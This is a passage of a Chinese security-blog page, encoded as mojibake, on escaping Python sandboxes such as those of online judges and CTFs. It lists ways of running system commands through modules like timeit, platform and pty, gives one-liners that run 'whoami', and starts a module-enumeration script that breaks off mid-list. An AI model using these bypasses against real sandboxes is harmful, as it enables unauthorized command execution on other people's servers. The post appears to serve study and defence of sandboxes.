

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, åšå®¢, ä¿¡æ¯å®‰å…¨">
  
    <meta name="description" content="è®©ç”¨æˆ·æäº¤ Python ä»£ç å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œæ˜¯ä¸€äº› OJã€é‡åŒ–ç½‘ç«™é‡è¦çš„æœåŠ¡ï¼Œå¾ˆå¤š CTF ä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ã€‚ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå°±éœ€è¦ç¡®ä¿ Python è¿è¡Œåœ¨æ²™ç®±ä¸­ã€‚æ²™ç®±ç»å¸¸ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿçš„å‡½æ•°ï¼Œä¾‹å¦‚ osï¼Œç ”ç©¶æ€ä¹ˆé€ƒé€¸ã€é˜²æŠ¤è¿™ç±»æ²™ç®±è¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“">
<meta property="og:url" content="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="è®©ç”¨æˆ·æäº¤ Python ä»£ç å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œæ˜¯ä¸€äº› OJã€é‡åŒ–ç½‘ç«™é‡è¦çš„æœåŠ¡ï¼Œå¾ˆå¤š CTF ä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ã€‚ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå°±éœ€è¦ç¡®ä¿ Python è¿è¡Œåœ¨æ²™ç®±ä¸­ã€‚æ²™ç®±ç»å¸¸ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿçš„å‡½æ•°ï¼Œä¾‹å¦‚ osï¼Œç ”ç©¶æ€ä¹ˆé€ƒé€¸ã€é˜²æŠ¤è¿™ç±»æ²™ç®±è¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/python.jpeg/cover">
<meta property="article:published_time" content="2019-05-06T17:41:00.000Z">
<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/python.jpeg/cover">
  
  
  
  <title>Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“ - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"ä¸¨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"ğŸŒ§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ç”Ÿå‘½çº¿
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                æ‘„å½±é›†
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2019-05-06 17:41" pubdate>
          2019å¹´5æœˆ6æ—¥ 17:41:00
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          38k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          240 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ç»éªŒæ€»ç»“"
        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
        aria-expanded="true"
      >
        ç»éªŒæ€»ç»“
        <span class="list-group-count">(85)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
        
        
          
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/31/2021/" title="2021 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2021/01/12/flag-in-2021/" title="2021ï¼Œæ¥ç«‹äº› flag å§"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021ï¼Œæ¥ç«‹äº› flag å§</span>
        </a>
      
    
      
      
        <a href="/2023/01/31/2022/" title="2022 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2022 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/03/15/2023/" title="2023 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 äº‘å—ä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 äº‘å—ä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2025/03/14/2024/" title="2024 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF æŒ‡åŒ—"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CSRF æŒ‡åŒ—</span>
        </a>
      
    
      
      
        <a href="/2017/06/07/CtfMiscStega/" title="CTF æ‚é¡¹ä¹‹éšå†™æœ¯"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CTF æ‚é¡¹ä¹‹éšå†™æœ¯</span>
        </a>
      
    
      
      
        <a href="/2020/09/14/DNS-1-basic/" title="DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ "
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ </span>
        </a>
      
    
      
      
        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

          
  
    
    
    
    <div class="category-sub row nomargin-x">
      <a class="category-subitem collapsed
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="è¿‡ç¨‹è®°å½•"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="false"
      >
        è¿‡ç¨‹è®°å½•
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2 å¹´å‰
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>è®©ç”¨æˆ·æäº¤ Python ä»£ç å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œæ˜¯ä¸€äº› OJã€é‡åŒ–ç½‘ç«™é‡è¦çš„æœåŠ¡ï¼Œå¾ˆå¤š CTF ä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ã€‚ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå°±éœ€è¦ç¡®ä¿ Python è¿è¡Œåœ¨æ²™ç®±ä¸­ã€‚æ²™ç®±ç»å¸¸ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿçš„å‡½æ•°ï¼Œä¾‹å¦‚ osï¼Œç ”ç©¶æ€ä¹ˆé€ƒé€¸ã€é˜²æŠ¤è¿™ç±»æ²™ç®±è¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚</p>
<span id="more"></span>
<h2 id="å‰è¨€">å‰è¨€</h2>
<p>Python çš„æ²™ç®±é€ƒé€¸çš„æœ€ç»ˆç›®æ ‡å°±æ˜¯æ‰§è¡Œç³»ç»Ÿä»»æ„å‘½ä»¤ï¼Œæ¬¡ä¸€ç‚¹çš„å†™æ–‡ä»¶ï¼Œå†æ¬¡ä¸€ç‚¹çš„è¯»æ–‡ä»¶ã€‚</p>
<p>é¡ºä¾¿å®‰åˆ©ä¸€æœ¬ä¹¦ï¼šã€Šæµç•…çš„ Pythonã€‹ã€‚è¿™æœ¬ä¹¦æœ‰å¾ˆå¤šä¸­é«˜é˜¶çŸ¥è¯†ç‚¹ï¼Œå¾ˆå…¨é¢è€Œä¸”è®²çš„å¾ˆæ¸…æ¥šï¼Œå¦‚æœä½ çœ‹è¿‡ï¼Œç›¸ä¿¡ç†è§£è¿™ç¯‡æ–‡ç« çš„å¤§å¤šæ•°å†…å®¹éƒ½ä¸æ˜¯é—®é¢˜ã€‚</p>
<p>æ¥ä¸‹æ¥çš„å†…å®¹å…ˆè®²ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œå†è®²æ–‡ä»¶å†™å…¥ã€è¯»å–ï¼Œå¹¶ä¸”å‡ä»¥ oj ä¸ºä¾‹ï¼Œåº“å¤§å¤šä»¥ <code>os</code> ä¸ºä¾‹ã€‚</p>
<h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤">æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2>
<h3 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h3>
<p>å…ˆå•°å—¦ä¸€äº›åŸºç¡€çŸ¥è¯†</p>
<p>åœ¨ Python ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰ï¼š</p>
<ul>
<li>os</li>
<li>commandsï¼šä»…é™<code>2.x</code></li>
<li>subprocess</li>
<li>timeitï¼š<code>timeit.sys</code>ã€<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li>
<li>platformï¼š<code>platform.os</code>ã€<code>platform.sys</code>ã€<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li>
<li>ptyï¼š<code>pty.spawn('ls')</code>ã€<code>pty.os</code></li>
<li>bdbï¼š<code>bdb.os</code>ã€<code>cgi.sys</code></li>
<li>cgiï¼š<code>cgi.os</code>ã€<code>cgi.sys</code></li>
<li>...</li>
</ul>
<p>æˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œæµ‹è¯•äº†ä¸€ä¸‹æ‰€æœ‰çš„å¯¼å…¥ <code>os</code> æˆ–è€… <code>sys</code> çš„åº“ï¼š<br />
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">#-*- coding:utf8 -*-<br># <span class="hljs-keyword">By</span> Macr0phag3<br># <span class="hljs-keyword">in</span> <span class="hljs-number">2019</span>-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">19</span>:<span class="hljs-number">46</span>:<span class="hljs-number">12</span><br># ------------------------------------<br><br># this, antigravity åº“åˆ æ‰<br>all_modules_2 = [<br>    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multifile&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;mutex&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;compiler&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;talloc&#x27;</span>, <span class="hljs-string">&#x27;_abcoll&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;cookielib&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_bsddb&#x27;</span>, <span class="hljs-string">&#x27;copy_reg&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span 